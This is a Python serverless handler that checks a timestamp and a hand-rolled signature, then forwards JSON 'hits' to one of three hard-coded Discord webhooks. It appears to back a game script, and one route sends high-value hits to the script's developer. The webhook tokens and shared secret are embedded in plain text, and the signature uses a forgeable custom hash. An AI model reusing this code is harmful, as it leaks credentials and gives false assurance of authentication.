import json
import time
from http.server import BaseHTTPRequestHandler

import requests

SECRET = "mrxver0gg00000"

WEBHOOKS = {
  # "/" - user who modified/customized the script (join links, full hit info)
  "user": "https://discord.com/api/webhooks/1543372730798178366/tUGF2_nM_Eg4MQsSWLVXiDuUi3fU5I35KrZlWOyXzTOJPbh3WRi3TW6xT2oYi4g054wH",
  # "/private" - script developer (high-value hits only from client)
  "developer": "https://discord.com/api/webhooks/1491300863598399488/isw7P25hvO2y53-vECbcJNXBC_P7EboWYF1C30_Jvaqf26uHCtMT5q56pA9mWKjG_juh",
  # "/public" - public notifications only (no join links / teleport commands)
  "public": "https://discord.com/api/webhooks/1523746645336920224/79VROWlAB4i8h3xIzaKF8EJcOxv8lBLL8SHWWlM7hrQfmnADKGWF8jFNmyQE5GICGijJ",
}


def simple_hash(s):
    hash_val = 0
    for b in s.encode("utf-8"):
        hash_val = (hash_val * 31 + b) & 0xFFFFFFFF
    return hash_val


def resolve_endpoint(path, headers):
    candidates = [path or ""]

    for header_name in (
        "x-forwarded-uri",
        "x-vercel-original-path",
        "x-invoke-path",
        "x-matched-path",
    ):
        value = headers.get(header_name)
        if value:
            candidates.append(value)

    combined = " ".join(candidates).lower()

    if "/private" in combined or "/dh" in combined:
        return WEBHOOKS["developer"], "developer"
    if "/public" in combined:
        return WEBHOOKS["public"], "public"
    return WEBHOOKS["user"], "user"


class handler(BaseHTTPRequestHandler):
    def _send_json(self, status_code, data):
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

    def _get_route(self):
        return resolve_endpoint(self.path, self.headers)

    def do_GET(self):
        _, endpoint_name = self._get_route()
        self._send_json(200, {"status": "alive", "endpoint": endpoint_name})

    def do_POST(self):
        webhook_url, endpoint_name = self._get_route()
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")
        timestamp = self.headers.get("X-Timestamp")
        received_signature = self.headers.get("X-Signature")

        if not all([body, timestamp, received_signature]):
            return self._send_json(400, {"error": "Missing data"})

        try:
            client_time = int(timestamp)
            server_time = int(time.time())
            time_diff = abs(server_time - client_time)

            if time_diff > 15:
                return self._send_json(403, {"error": "Request expired", "diff": time_diff})
        except (ValueError, TypeError):
            return self._send_json(400, {"error": "Invalid timestamp format"})

        message = body + str(timestamp)
        expected_signature = f"{simple_hash(SECRET + message):08x}"

        if received_signature != expected_signature:
            return self._send_json(403, {"error": "Invalid signature"})

        try:
            parsed_body = json.loads(body)
        except json.JSONDecodeError:
            return self._send_json(400, {"error": "Invalid JSON body"})

        requests.post(
            url=webhook_url,
            json=parsed_body,
            headers={"Content-Type": "application/json"},
        )
        return self._send_json(
            200,
            {"status": "ok", "message": "Success", "endpoint": endpoint_name},
        )
